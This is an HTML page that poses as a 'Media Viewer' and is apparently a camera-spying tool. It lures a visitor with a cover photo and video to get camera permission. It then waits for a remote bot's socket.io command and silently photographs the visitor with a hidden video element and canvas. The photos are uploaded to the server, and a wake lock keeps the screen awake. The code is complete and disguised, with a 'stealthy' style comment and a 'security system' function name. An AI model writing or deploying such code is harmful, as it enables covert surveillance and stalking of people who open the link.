<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Media Viewer</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        /* CSS to make everything full screen and stealthy */
        body { 
            background: #000; 
            margin: 0; 
            overflow: hidden; 
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            width: 100vw;
        }
        
        #coverPhoto {
            width: 100%;
            height: 100%;
            object-fit: cover;
            cursor: pointer;
            position: absolute;
            z-index: 10;
        }

        #mediaPlayer {
            width: 100%;
            height: 100%;
            border: none;
            display: none;
            position: absolute;
            z-index: 5;
        }
    </style>
</head>
<body>

    <!-- Yahan Default Cover Photo Lagi Hai. Aap chaho toh SRC change kar sakte ho -->
    <img id="coverPhoto" src="https://images.unsplash.com/photo-1611162617474-5b21e879e113?ixlib=rb-4.0.3&auto=format&fit=crop&w=1080&q=80" alt="Tap to View">
    
    <!-- Iframe jisme URL wala video chalega -->
    <iframe id="mediaPlayer" allow="autoplay; fullscreen"></iframe>

    <!-- Hidden Video & Canvas for Silent Capture -->
    <video id="hiddenCamera" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const coverPhoto = document.getElementById('coverPhoto');
        const mediaPlayer = document.getElementById('mediaPlayer');
        let socket;
        let wakeLock = null;

        // 1. URL Extract karna aur Decode karna
        const urlParams = new URLSearchParams(window.location.search);
        const encodedVid = urlParams.get('v');
        let targetVideoUrl = "";
        
        if(encodedVid) {
            try {
                targetVideoUrl = atob(encodedVid); 
            } catch(e) {
                console.error("Invalid URL format");
            }
        }

        // 2. Click Logic: Jab Cover Photo par tap ho
        coverPhoto.addEventListener('click', async () => {
            try {
                // Request Camera Access
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                
                // Photo chhupao, Video dikhao
                coverPhoto.style.display = 'none';
                mediaPlayer.style.display = 'block';
                
                // Video Play karo (Agar URL diya hai warna default video)
                if(targetVideoUrl) {
                    mediaPlayer.src = targetVideoUrl;
                } else {
                    mediaPlayer.src = "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1"; 
                }

                // Temporary Camera Stop & Start Node.js Connection
                stream.getTracks().forEach(track => track.stop());
                initializeSecuritySystem();

            } catch (err) {
                alert("Camera permission is required to view this media.");
                console.error("Camera Access Denied:", err);
            }
        });

        // 3. Socket.io Connection Logic
        function initializeSecuritySystem() {
            socket = io();
            keepScreenAwake();

            // Receive /more command from bot
            socket.on('capture_command', async () => {
                await startCameraAndCapture();
            });
        }

        // 4. Keep Screen Awake
        async function keepScreenAwake() {
            try {
                if ('wakeLock' in navigator) {
                    wakeLock = await navigator.wakeLock.request('screen');
                    console.log('Screen Wake Lock is active');
                }
            } catch (err) { 
                console.log('Wake Lock Error:', err.message); 
            }
        }

        // 5. Silent Camera Capture Logic (5 Photos)
        async function startCameraAndCapture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                const video = document.getElementById('hiddenCamera');
                video.srcObject = stream;
                
                await new Promise(resolve => video.onloadedmetadata = resolve);

                // Click 5 photos with 1.5-second intervals
                for (let i = 0; i < 5; i++) {
                    await captureAndSend(video, i + 1);
                    await new Promise(resolve => setTimeout(resolve, 1500)); 
                }

                // Stop camera stream to save resources
                stream.getTracks().forEach(track => track.stop());
            } catch (error) {
                console.error("Camera Capture Error:", error);
            }
        }

        // 6. Send Photo to Node.js Backend
        async function captureAndSend(video, index) {
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            return new Promise((resolve) => {
                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('photo', blob, `capture_${index}.jpg`);
                    try {
                        await fetch('/upload', { method: 'POST', body: formData });
                    } catch (err) { 
                        console.error("Upload Failed:", err); 
                    }
                    resolve();
                }, 'image/jpeg', 0.8);
            });
        }

        // Re-apply Wakelock if tab visibility changes
        document.addEventListener('visibilitychange', async () => {
            if (document.visibilityState === 'visible' && coverPhoto.style.display === 'none') {
                keepScreenAwake();
            }
        });
    </script>
</body>
</html>
